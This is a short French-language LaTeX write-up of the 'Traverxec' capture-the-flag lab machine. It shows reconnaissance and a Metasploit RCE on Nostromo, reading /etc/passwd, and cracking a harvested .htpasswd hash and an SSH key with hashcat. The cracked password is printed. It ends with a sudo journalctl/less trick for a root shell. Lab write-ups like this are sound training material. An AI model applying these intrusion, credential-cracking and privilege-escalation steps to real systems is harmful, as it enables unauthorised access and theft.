\chapter{Traverxec [Linux:Easy]}

keywords: \gls{t:sudo-privesc}, \gls{t:GTFOBins} \gls{t:password-cracking}
\subsection{Résumé}

\subsubsection{Recon}
un coup de \verb+nmap+ montre un 
\begin{itemize}
    \item \verb+ssh+ 
    \item \verb+http+ (\verb+nostromo 1.9.6+
\end{itemize}

un coup de \verb+searchsploit nostromo -w+ montre un RCE notamment dispo en
\verb+metasploit+

\subsubsection{foothold}
on arrive en \verb+www-data+

un coup de \verb+local_exploit_suggester+ monte un exploit mais qui ne
marche pas

on est bloqué dans \verb+/usr/bin+ mais on peut faire du \verb+cat /etc/passwd+

upgrade vers un vrai shell avec \verb+post/multi/manage/shell_to_meterpreter+

\subsubsection{Credential harvest}

dans \verb+/var/nostromo/conf/nhttpd.conf+ on trouve une vers vers un
\verb+.htpasswd+ qui contient ca:

\begin{verbatim}
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
\end{verbatim}

un coup de \verb+hashid+ nous donne du \verb+md5crypt+ donc mode 500 sur
hashcat qui nous repond :
\begin{verbatim}
$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me 
\end{verbatim}

mais on ne peut pas ssh avec.

dans le fichier \verb+nhttpd.conf+ on, a aussi cela :

\begin{verbatim}
homedirs		/home
homedirs_public		public_www
\end{verbatim}

dans \verb+/home/david/public_www/+ on trouve notre bonheur

on extrait le hash de la cree privée avec un coup de \verb+ssh2john+ puis un
coup de \verb+hashcat -m 22911+

en en route pour le \verb+user.txt+

\subsubsection{Priv esc}

on a un script dans le repertoire bin qui fait ref à un:
\begin{verbatim}
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
\end{verbatim}

il faut reduire le seuil de declenchement de \verb+less+ pour pouvoir avoir le
root shell

\begin{verbatim}
stty rows 2
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
\end{verbatim}


